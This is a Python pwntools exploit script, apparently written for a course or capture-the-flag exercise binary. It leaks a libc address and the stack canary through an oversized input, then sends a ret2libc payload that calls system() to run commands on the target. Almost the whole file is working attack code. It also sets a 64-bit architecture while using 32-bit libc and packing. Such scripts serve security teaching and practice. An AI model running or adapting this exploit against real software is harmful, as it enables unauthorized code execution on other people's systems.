#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise4/exercise4a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
r = start()
libc = ELF('/usr/lib/i386-linux-gnu/libc-2.31.so')
elf = ELF(exe)

r.sendline(b'cat flag')
for i in range(4):
    r.recvline()

r.sendline(b'A'*39)
r.recvline()
r.recvline()
msg = r.recvline()

print_address = msg[:4]
name_address = msg[12:16]
canary = msg[16:20]

shift = u32(print_address) - libc.symbols['printf']
payload = b'A' * 56 + canary + b'A' * 16 + p32(libc.symbols['system'] + shift) + p32(libc.symbols['exit'] + shift) + name_address

r.sendline(payload)

print(r.recvall())

